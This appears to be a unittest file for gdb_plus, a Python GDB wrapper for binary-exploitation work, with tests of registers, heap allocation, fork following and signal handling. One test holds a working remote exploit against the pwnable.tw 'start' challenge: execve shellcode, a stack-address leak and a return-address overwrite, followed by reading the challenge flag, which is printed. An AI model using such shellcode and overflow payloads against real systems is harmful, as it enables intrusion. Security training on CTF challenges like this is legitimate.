import unittest
from gdb_plus import *
import warnings

class Debugger_process(unittest.TestCase):
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)
		pass

	def tearDown(self):
		pass

	def test_file(self):
		gdbscript = "continue"
		dbg = Debugger("./start", script=gdbscript).remote("chall.pwnable.tw", 10000)
		self.assertEqual(dbg.recv(), b"Let's start the CTF:")
		dbg.close()
		
		context.noptrace = True
		dbg = Debugger("./start").remote("chall.pwnable.tw", 10000)
		self.assertEqual(dbg.recv(), b"Let's start the CTF:")
		self.assertFalse(dbg.gdb) 
		dbg.close()
		context.noptrace = False

		args.REMOTE = True
		dbg = Debugger("./start").remote("chall.pwnable.tw", 10000)
		shellcode = b"\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xC9\x31\xD2\xcd\x80"
		dbg.p.recv()
		dbg.p.send(b"\x90" * 0x14 + p32(0x804808b))
		dbg.p.recv(0x18)
		leak = unpack(dbg.p.recv(4))
		offset = 0xffb49d00 - 0xffb49ce4
		stack = leak - offset
		dbg.p.recv()
		dbg.p.send(shellcode.ljust(0x2c, b'\x90') + p32(stack))
		dbg.p.sendline("cat /home/start/flag")
		self.assertEqual(dbg.p.recv().strip(), b"FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}")
		dbg.close()
		args.REMOTE = ""

	def test_process(self):
		p = process("./start")
		dbg = Debugger(p)
		self.assertEqual(dbg.p.recv(), b"Let's start the CTF:")
		dbg.close()
		p.close()

	def test_pid(self):
		p = process("./start")
		self.assertEqual(type(p.pid), int)
		dbg = Debugger(p.pid)
		# I don't think it will be possible to comunicate just with the pid. You can debug the process, but will have to interact manually
		#self.assertEqual(dbg.p.recv(), b"Let's start the CTF:")
		dbg.close()
		p.close()

	def test_compatibility_pwntools(self):
		p = process("./start")
		dbg = Debugger(p)
		self.assertEqual(dbg.recv(), b"Let's start the CTF:")
		dbg.close()
		p.close()

# Find a way to test wait and interrupt

class Debugger_memory(unittest.TestCase):
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)
		self.dbg = Debugger("./cube")

	def tearDown(self):
		self.dbg.close()

	def test_register_access(self):
		self.dbg.rax = 0xdeadbeefdeadbeef
		self.dbg.eax = 0xfafafafa
		self.dbg.ax  = 0xbabe
		self.dbg.ah = 0x90
		self.assertEqual(self.dbg.rax, 0xdeadbeeffafa90be)
		self.dbg.r11 = 0x134343432342
		self.assertEqual(self.dbg.r11, 0x134343432342)

	def test_special_registers(self):
		self.assertEqual(self.dbg.return_pointer, self.dbg.rax)
		self.assertEqual(self.dbg.stack_pointer, self.dbg.rsp)
		self.assertEqual(self.dbg.instruction_pointer, self.dbg.rip)

	def test_alloc(self):
		dbg = Debugger("./cube", aslr=False, from_start=False) # Wait for the libc to be loaded
		pointer = dbg.alloc(16)
		dbg.write(pointer, p64(0xdeadbeeffafa90be))
		self.assertTrue(hex(pointer) in dbg.execute("heap chunks")) # WARNING THIS ONLY WORKS WITH GEF
		dbg.dealloc(pointer)
		pointer = dbg.alloc(16, heap=False)
		dbg.write(pointer, p64(0xdeadbeeffafa90be))
		dbg.dealloc(pointer, len=16, heap=False)
		# remember dealloc in the bss will only delete the last chunk... 
		dbg.close()
		
class Debbuger_fork(unittest.TestCase):
	from base64 import b64encode
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)

	def http_request(self, *, auth: bytes = b64encode(b"admin:admin"), keepAlive: bool = False):
		LINE_TERMINATOR =  b"\r\n"
		request = []
		request.append(b"GET / HTTP/1.1")
		request.append(b"authorization: Basic " + auth) 
		if keepAlive:
			request.append(b"Connection: keep-alive")
		else:
			request.append(b"Connection: close")
		return LINE_TERMINATOR.join(request + [b""])

	def test_continuous_follow(self):
		gdbscript = """
		set detach-on-fork off
		set follow-fork-mode child
		"""
		dbg = Debugger("./httpd", aslr=False, script=gdbscript)
		CALL_TO_B64DECODE = 0x26d5
		dbg.b(CALL_TO_B64DECODE)
		dbg.c()
		dbg.p.sendline(self.http_request(keepAlive=True))
		dbg.wait()
		self.assertEqual(dbg.rip, 0x5555555566d5)
		dbg.c() # Don't forget to switch only after the child has continued
		# do what you want and go back to the parent once you are done (you can also do it after the children death)
		print("the first child is dead")
		#dbg.wait() # Non riceve mai il segnale che è finito...
		sleep(2) # TODO find an alternative than waiting for the child to die
		dbg.execute("inferior 1") # We can't go back while the child is running
		dbg.c()
		dbg.p.sendline(self.http_request(keepAlive=True))
		dbg.wait()
		self.assertEqual(dbg.rip, 0x5555555566d5)
		dbg.close()

class Debugger_signals(unittest.TestCase):
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)
		warnings.simplefilter("ignore", ImportWarning)
		self.dbg = Debugger("./ExceptionalChecking_patched")

	def tearDown(self):
		self.dbg.close()

	#Already present in test_signal_handler. Use it to debug the later if needed
#	def test_step_until_ret(self):
#		from queue import Queue
#		HANDLER_RET = 0x04011ff
#		CHECK_CALL = 0x0401341
#		my_instruction_pointer = Queue()
#		def callback_signal_handler(dbg):
#			dbg.breakpoint(my_instruction_pointer.get(), temporary=True)
#			return False
#		self.dbg.breakpoint(HANDLER_RET, callback=callback_signal_handler)
#		self.dbg.breakpoint(CHECK_CALL, temporary=True)
#		self.dbg.cont()
#		self.dbg.p.sendline(b"serial_a_caso")
#		self.dbg.wait()
#		self.dbg.step()
#		self.dbg.next_signal = False
#		output = []
#		def callback(dbg):
#			if dbg.next_signal:
#				my_instruction_pointer.put(dbg.instruction_pointer)
#				dbg.execute("signal SIGUSR1")
#				dbg.wait()
#				dbg.next_signal = False
#			ni = dbg.next_inst
#			if ni.mnemonic == "int3":
#				dbg.next_signal = True
#				dbg.write(dbg.instruction_pointer, b"\x90") #Just to avoid problems
#			else:
#				output.append(ni.toString())
#		self.dbg.step_until_ret(callback)
#		with open("dump_ExceptionalChecking") as fp:
#			self.assertEqual(output, fp.read().split("\n"))

	def test_signal_handler(self):
		from queue import Queue
		HANDLER_RET = 0x04011ff
		CHECK_CALL = 0x0401341
		self.dbg.breakpoint(CHECK_CALL, temporary=True)
		self.dbg.cont()
		self.dbg.p.sendline(b"serial_a_caso")
		self.dbg.wait()
		self.dbg.step()
		self.dbg.next_signal = False
		output = []
		def callback(dbg):
			if dbg.next_signal:
				print("call signal")
				dbg.signal("SIGUSR1", handler=HANDLER_RET)
				dbg.next_signal = False
			ni = dbg.next_inst
			if ni.mnemonic == "int3":
				print("int3")
				dbg.next_signal = True
				dbg.write(dbg.instruction_pointer, b"\x90") #Just to avoid problems
			else:
				print(ni.toString())
				output.append(ni.toString())
		self.dbg.step_until_ret(callback)
		with open("dump_ExceptionalChecking") as fp:
			self.assertEqual(output, fp.read().split("\n"))

class Debugger_calls(unittest.TestCase):
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)

	def test_call(self):
		out = []
		dbg = Debugger("./cube", from_start=False, aslr=False) # You must wait for the libc to be loaded to call malloc
		for mossa in [0x00003175, 0x00003e74, 0x000038d9, 0x00001885]:
			# Create blank cube
			pointer = dbg.alloc(54*8)
			for i in range(54):
				dbg.write(pointer+i*8, p64(i))

			dbg.call(dbg.get_base_elf() + mossa, [pointer])
			out.append(f"prossima funzione {hex(dbg.get_base_elf() + mossa)}")
			for i in range(54):
				out.append(f"{i}: {u64(dbg.read(pointer+i*8, 8))}")
		#print("\n".join(out)) 
		with open("./dump_Cube") as fd:
			self.assertEqual(out, fd.read().split("\n"))
		dbg.close()

class Debugger_fancy_gdb(unittest.TestCase):

	def test_pwndbg(self):
		gdbinit = """
		source ~/.gdbinit-pwndbg
		"""
		dbg = Debugger("./httpd", script=gdbinit, from_start=False)
		dbg.c()
		sleep(1)
		dbg.interrupt() # Non è questo ad ucciderlo anche se printa SIGINT
		pointer = dbg.alloc(16, heap=False)
		dbg.write(pointer, p64(0xdeadbeeffafa90be))
		pointer = dbg.alloc(16)
		dbg.write(pointer, p64(0xdeadbeeffafa90be))
		dbg.close()
		gdbinit = """
		source ~/.gdbinit-gef.py
		"""
		dbg = Debugger("./httpd", script=gdbinit, from_start=False)
		pointer = dbg.alloc(16)
		dbg.write(pointer, p64(0xdeadbeeffafa90be))
		dbg.close()

if __name__ == "__main__":
	unittest.main()